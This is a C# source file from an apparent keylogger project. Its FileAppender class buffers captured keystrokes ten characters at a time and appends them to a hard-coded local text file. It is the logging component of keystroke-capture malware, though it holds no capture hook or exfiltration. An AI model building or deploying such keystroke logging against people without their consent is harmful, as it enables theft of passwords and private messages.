using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger.Library.Appenders
{
    public class FileAppender : IOutputAppender
    {
        private const int N = 10;
        private const string FILE_PATH = @"C:\git_repo\Custom.dotNet.Keylogger\WriteText.txt";

        private static FileAppender _instance;
        private static char[] _buffer;
        private static short _counter;

        public static FileAppender Instance
        {
            get
            {
                if (_instance == null)
                {
                    _instance = new FileAppender();
                }
                return _instance;
            }
        }

        private FileAppender()
        {
            _buffer = new char[N];
            _counter = 0;
        }

        public void SaveToBuffer(char key)
        {
            if (_counter == N)
            {
                writeToDisk();
                _counter = 0;
                Array.Clear(_buffer, 0, N);
            }

            _buffer[_counter] = key;
            _counter++;  
        }

        public void FinalPush()
        {
            _counter = 0;
            writeToDisk();
        }

        private void writeToDisk()
        {
            string text = System.Text.Encoding.UTF8.GetString(System.Text.Encoding.UTF8.GetBytes(_buffer));
            // WriteAllText creates a file, writes the specified string to the file,
            // and then closes the file. You do NOT need to call Flush() or Close().
            System.IO.File.AppendAllText(FILE_PATH, text, Encoding.UTF8);

        }
      
    }
}
